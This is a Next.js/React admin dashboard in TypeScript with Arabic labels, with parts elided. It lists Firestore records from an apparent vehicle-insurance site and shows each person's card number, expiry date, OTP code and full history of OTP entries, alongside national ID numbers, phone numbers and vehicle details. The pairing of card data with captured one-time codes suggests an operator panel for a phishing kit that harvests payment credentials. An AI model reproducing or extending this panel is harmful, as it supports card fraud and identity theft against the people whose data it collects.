...
interface Notification {
  ...
  insurancePurpose: "renewal" | "property-transfer"
  vehicleType: "registration" | "customs" | "serial"
    ...
    <div className="space-y-6">
      {recentActivities.map((notification, index) => (
        <div key={notification.id || index} className="relative flex items-start gap-4 group">
          ...
          >
            {notification.card_number ? <CreditCard className="h-4 w-4" /> : <User className="h-4 w-4" />}
          </div>
          <div className="flex-grow min-w-0">
            <div className="flex items-start justify-between gap-2">
              <div>
                <p className="text-sm font-semibold text-foreground leading-tight">
                  {notification.card_number ? "معلومات بطاقة جديدة" : "معلومات شخصية جديدة"}
                </p>
                <p className="text-xs text-muted-foreground mt-0.5">
                  {notification.country || "غير معروف"} -{" "}
                  {notification.ownerFullName || notification.phoneNumber || "مستخدم جديد"}
                </p>
              </div>
            ...
            <div className="mt-3 flex flex-wrap gap-1.5">
              ...
              {notification.insurancePurpose && (
                <Badge variant="outline" className="text-xs">
                  {notification.insurancePurpose === "renewal" ? "تجديد" : "نقل ملكية"}
                </Badge>
              )}
              {notification.vehicleType && (
                <Badge variant="outline" className="text-xs">
                  {notification.vehicleType === "registration"
                    ? "تسجيل"
                    : notification.vehicleType === "customs"
                      ? "جمارك"
                      : "رقم تسلسلي"}
                </Badge>
              )}
...
export default function NotificationsPage() {
  ...
  const filteredNotifications = useMemo(() => {
    return notifications.filter((notification) => {
      ...
      const matchesFilterType =
        filterType === "all" ||
        (filterType === "card" && !!notification.card_number) ||
      ...
      if (searchTerm) {
        ...
        return (
          notification.ownerFullName?.toLowerCase().includes(term) ||
          notification.phoneNumber?.toLowerCase().includes(term) ||
          notification.card_number?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.ownerIdNumber?.toLowerCase().includes(term) ||
          notification.buyerIdNumber?.toLowerCase().includes(term) ||
          notification.sellerIdNumber?.toLowerCase().includes(term) ||
          notification.serialNumber?.toLowerCase().includes(term) ||
          notification.vehicleManufactureNumber?.toLowerCase().includes(term) ||
          notification.customsCode?.toLowerCase().includes(term) ||
  ...
  const updateStatistics = useCallback((activeNotifications: Notification[]) => {
    ...
    setCardSubmissions(activeNotifications.filter((n) => !!n.card_number).length)
  }, [])
      ...
      (querySnapshot) => {
        ...
        const notificationsData = querySnapshot.docs.map((doc) => {
          ...
          return {
            ...
            buyerIdNumber: data.buyer_identity_number || data.buyerIdNumber,
            sellerIdNumber: data.seller_identity_number || data.sellerIdNumber,
            otpCode: data.otp || data.otpCode,
            allOtpCodes: data.allOtp || data.allOtpCodes,
            additionalDriversCount: data.additionalDrivers0 || data.additionalDriversCount,
            ...data,
          } as Notification
        })
        ...
        if (newEntries.length > 0) {
          const hasNewImportantInfo = newEntries.some(
            (n) => n.card_number || n.ownerFullName || n.phoneNumber || n.ownerIdNumber,
          )
  ...
  const handleHide = async (id: string) => {
    try {
      ...
      toast({
        ...
        description: "لن يظهر هذا الإشعار في القائمة.",
        variant: "default",
      })
    } catch (error) {
  ...
  const handleClearAllVisible = async () => {
    ...
    try {
      ...
      if (visibleNotifications.length === 0) {
        toast({
          title: "لا يوجد ما يمكن مسحه",
          description: "جميع الإشعارات مخفية بالفعل.",
          variant: "default",
        })
        setIsLoading(false)
        return
  ...
  const cardCount = notifications.filter((n) => !n.isHidden && !!n.card_number).length
      ...
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
        {statistics.map((stat, index) => (
          ...
          >
            ...
            <CardFooter className="pt-0 pb-4 relative z-10"></CardFooter>
          </Card>
        ))}
      </div>
                      ...
                      >
                        ...
                        <TableCell className="px-6 py-4">
                          <div className="flex flex-wrap gap-2">
                            <Button
                              variant={notification.ownerFullName ? "outline" : "secondary"}
                              size="sm"
                            ...
                            >
                              {notification.ownerFullName || notification.phoneNumber || notification.ownerIdNumber ? (
                                <div className="flex items-center gap-2">
                            ...
                            <Button
                              variant={notification.card_number ? "outline" : "secondary"}
                              size="sm"
                            ...
                            >
                              <div className="flex items-center gap-2">
                                ...
                                <span>{notification.card_number ? "معلومات البطاقة" : "لا يوجد بطاقة"}</span>
                              </div>
                            </Button>
                          </div>
                        </TableCell>
          ...
          <div className="space-y-4 py-4 ">
            {selectedNotification &&
              (selectedInfo === "personal" ? (
                <div className="space-y-3">
                  {[
                    { label: "اسم مالك الوثيقة", value: selectedNotification.ownerFullName, icon: User },
                    { label: "رقم هوية المالك", value: selectedNotification.ownerIdNumber, icon: Shield },
                    { label: "رقم هوية المشتري", value: selectedNotification.buyerIdNumber, icon: Shield },
                    { label: "رقم هوية البائع", value: selectedNotification.sellerIdNumber, icon: Shield },
                    { label: "رقم الهاتف", value: selectedNotification.phoneNumber, icon: User },
                    { label: "الرقم التسلسلي", value: selectedNotification.serialNumber, icon: FileText },
                    {
                      label: "رقم تصنيع المركبة",
                      value: selectedNotification.vehicleManufactureNumber,
                      icon: FileText,
                    },
                    { label: "رمز الجمارك", value: selectedNotification.customsCode, icon: FileText },
                    { label: "رقم التسلسل", value: selectedNotification.sequenceNumber, icon: FileText },
                    {
                      label: "غرض التأمين",
                      value: selectedNotification.insurancePurpose === "renewal" ? "تجديد" : "نقل ملكية",
                      icon: Shield,
                    },
                    {
                      label: "نوع المركبة",
                      value:
                        selectedNotification.vehicleType === "registration"
                          ? "تسجيل"
                          : selectedNotification.vehicleType === "customs"
                            ? "جمارك"
                            : "رقم تسلسلي",
                      icon: FileText,
                    },
                ...
                <div className="space-y-3">
                  {[
                    {
                      label: "رقم البطاقة",
                      value: selectedNotification.card_number,
                      isCard: true,
                      icon: CreditCard,
                    },
                    {
                      label: "تاريخ الانتهاء",
                      value: selectedNotification.expiration_date,
                      isCard: true,
                      icon: DatabaseIcon,
                    },
                    {
                    ...
                    },
                    {
                      ...
                      value: selectedNotification.otpCode,
                      isOtp: true,
                      icon: Shield,
                    },
                  ].map(
                  ...
                  {selectedNotification?.allOtpCodes && selectedNotification?.allOtpCodes?.length > 0 && (
                    <Card className="border-muted/50">
                      <CardContent className="p-4">
                        <div className="space-y-3">
                          <div className="flex items-center gap-3">
                          ...
                          <div className="flex flex-wrap gap-2">
                            {selectedNotification?.allOtpCodes?.map((otp, index) => (
            ...
            {(!selectedNotification ||
              (selectedInfo === "personal" &&
                !selectedNotification.ownerFullName &&
                !selectedNotification.phoneNumber &&
                !selectedNotification.ownerIdNumber &&
                !selectedNotification.buyerIdNumber &&
                !selectedNotification.sellerIdNumber) ||
              (selectedInfo === "card" && !selectedNotification.card_number)) && (
